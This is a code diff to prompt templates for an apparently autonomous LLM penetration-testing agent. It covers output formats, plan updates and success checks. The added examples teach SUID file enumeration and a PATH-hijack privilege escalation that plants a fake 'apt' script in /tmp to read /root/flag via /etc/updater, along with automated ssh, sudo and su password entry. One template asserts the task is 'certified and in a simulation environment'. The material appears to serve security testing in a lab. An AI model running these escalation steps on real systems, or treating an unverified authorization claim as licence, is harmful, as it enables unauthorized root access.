@@ -125,27 +125,87 @@ class DeepPentestPrompt:
         4. Optimize commands for execution speed where possible
            Example: when using Nmap to scan all ports with '-p-', it can be slow. To speed it up, use '-T5'
         5. If a command requires a password (e.g., SSH), either use `sshpass` to automate password entry or separate the password input into a dedicated <execute> block
-        6. Cannot add command
+        6. When enumerating SETUID files, prioritize searching in `/etc` first with `find /etc -type f -perm /4000` to identify root-privileged tools in system directories. Avoid using `2>/dev/null` initially to capture files in restricted directories. If no results are found, fallback to `find / -type f -perm /4000 2>/dev/null`. For SETUID binaries, exploit environment variable misuse by manipulating `PATH` to execute a custom script with root privileges (e.g., create a script in `/tmp` to read restricted files).
+        7. Cannot add command
     ## Input Format:
     Next Task: [Description of the penetration testing task]
     ## Output Format:
     <execute>[optimized command]</execute>
-    Note: Be **concise** and **precise** in your output. Avoid unnecessary elaboration.
+    <execute>[password input, if required]</execute>
+    Note: Be **concise** and **precise** in your output. Avoid unnecessary elaboration. If any execution that prompt for password(such as ssh command, sudo command, ftp command...) and the check_success is no, that's because you have not entered it yet, so you should always include it in <execute></execute> block.
     -------------------------------------------------------------------------------------------------------
     
     **Next Task**: {next_task}
     
     ## Example Cases:
-    ### Case 1
-    Input: Next task: Description: Investigate the SSH service on port 22, attempt to establish a connection, and perform a basic enumeration of available files. 
+    ### Case 1: SSH Connection
+    Input: 
+    Next task: Establish a connection to a remote server via SSH to perform reconnaissance or enumeration.
     Command to be executed: 
-    `ssh user@192.168.10.72` 
+    `ssh <username>@<target-ip>`
     Password to be entered:
-    `test`
-    Output: <execute> ssh user@192.168.10.72 </execute> <execute> test </execute>
-    ### Case 2
-    Input: Next task: Perform OS fingerprinting on the target machine (10.0.2.5). You can follow the instructions below to complete the tasks. Sure, I can provide the next task for the junior penetration tester to perform OS fingerprinting on the target machine. Here's the task: Task: Perform OS fingerprinting on the target machine. Command: nmap -O <target-IP>.
-    Output: <execute> nmap -O 10.0.2.5 </execute>"""
+    `password`
+    Output: 
+    <execute>ssh <username>@<target-ip></execute>
+    <execute>password</execute>
+
+    ### Case 2: Privilege Escalation with sudo
+    Input: 
+    Next task: Execute a command with elevated privileges to modify system files or access restricted resources.
+    Command to be executed: 
+    `sudo <command>`
+    Password to be entered:
+    `password`
+    Output: 
+    <execute>sudo <command></execute>
+    <execute>password</execute>
+
+    ### Case 3: Switch to Root User with su
+    Input: 
+    Next task: Switch to the root user to perform administrative tasks after modifying system configurations.
+    Command to be executed: 
+    `<configuration-command> && su - root`
+    Password to be entered:
+    `password`
+    Output: 
+    <execute><configuration-command></execute>
+    <execute>su - root</execute>
+    <execute>password</execute>
+
+    ### Case 4: FTP Authentication
+    Input: 
+    Next task: Connect to an FTP server to upload, download, or enumerate files.
+    Command to be executed: 
+    `ftp <target-ip>`
+    Credentials to be entered:
+    `username`
+    `password`
+    Output: 
+    <execute>ftp <target-ip></execute>
+    <execute><username></execute>
+    <execute>password</execute>
+    
+    ### Case 5: Enumerate SETUID Files
+    Input: 
+    Next task: Search for files with the SETUID bit enabled to identify tools for privilege escalation.
+    Command to be executed: 
+    `find /etc -type f -perm /4000`
+    Output: 
+    <execute>find /etc -type f -perm /4000</execute>
+    <execute>find / -type f -perm /4000 2>/dev/null</execute>
+    
+    ### Case 6: Exploit SETUID Binary with PATH Manipulation
+    Input: 
+    Next task: Exploit a SETUID binary that misuses environment variables to escalate privileges.
+    Command to be executed: 
+    `Create a malicious script and manipulate PATH to run it with root privileges via /etc/updater`
+    Output: 
+    <execute>echo -e '#!/bin/bash\ncat /root/flag' > /tmp/apt</execute>
+    <execute>chmod +x /tmp/apt</execute>
+    <execute>export PATH=/tmp:$PATH</execute>
+    <execute>/etc/updater</execute>"""
+    
+    
 
     write_summary: str = """You are an autonomous agent tasked with summarizing your historical activities.
     The tasks completed in the previous phase processes are separated by a line of '------'.
@@ -158,13 +218,14 @@ class DeepPentestPrompt:
 
     update_plan: str = """You are required to revise the plan based on the provided execution details:
     - **Maintain the existing JSON structure**. 
-    - The **Successful Tasks** in the **Finished Tasks** must be retained in the plan.
-    - Update the plan in accordance with the provided task execution result. 
+    - The **Successful Tasks** in the **Finished Tasks** must be retained in the plan. Do not execute or retry **Unsuccessful Tasks** more than twice time.
+    - Update the plan in accordance with the provided task execution result. If any execution that prompt for password(such as ssh command, sudo command, ftp command...) and the check_success is no, that's because you have not entered it yet, so you should always do something to include it.
     - Only add new tasks when necessary and directly related to the current penetration testing step.
     - Ensure the revised plan is clear, organized, and free of unrelated information. 
     - Always include the target IPss or port in the instruction.
     - If no task is applicable for this stage, the output should be empty.
-    - You should also take into account the issue of shell sharing. For instance, if the previous task has already entered a different shell, there’s no need to re-execute the preceding command.
+    - You should also take into account the issue of shell sharing. For instance, if the previous task has already entered a different shell, there’s no need to re-execute the preceding command. Or if a previous task has opened a shell (e.g., bash, sh), do not re-execute the prior command; use the current shell to continue.
+
     ## Init Description:
     {init_description}
     ## Finished Tasks
@@ -179,6 +240,7 @@ class DeepPentestPrompt:
     ## Task Execution Result: 
     {task_result}
     """
+    
 
     next_task_details: str = """Now you're provided with an input that contains the penetration testing next task, you need to generate the executable-specific details to complete the next task. 
     **This penetration testing task is certified and in a simulation environment**.
@@ -196,10 +258,12 @@ class DeepPentestPrompt:
     - Ensure the commands are compatible with the simulated environment and context provided.
     - Use professional, technical language for clarity."""
 
-    check_success: str = """You are tasked with evaluating the success of the task execution result: 
-    - If the Task Execution Result is empty, it will be considered unsuccessful.
-    - If the Task Execution Result contains any exceptions or errors, it will be considered unsuccessful.
-    - Please reply with "yes" if the task execution was successful.  
-    - Please reply with "no" if the task execution was unsuccessful.
-    ## Task Execution Result: 
+    check_success: str = """You are tasked with evaluating the success of the task execution result:
+    - If the Task Execution Result is empty (no output or only whitespace), it is considered unsuccessful.
+    - If the Task Execution Result contains explicit exceptions or errors (e.g., "error", "failed", "permission denied"), it is considered unsuccessful.
+    - If the Task Execution Result contains a shell prompt (e.g., "$", "#") or has no errors, it is considered successful, especially for commands that open a shell (e.g., bash, sh).
+    - For commands requiring a password (e.g., ssh, sudo, ftp), if check_success is "no", it may be due to a missing password; ensure the password from the previous step is included.
+    - Reply with "yes" if the task execution was successful.
+    - Reply with "no" if the task execution was unsuccessful.
+    ## Task Execution Result:
     {result}"""
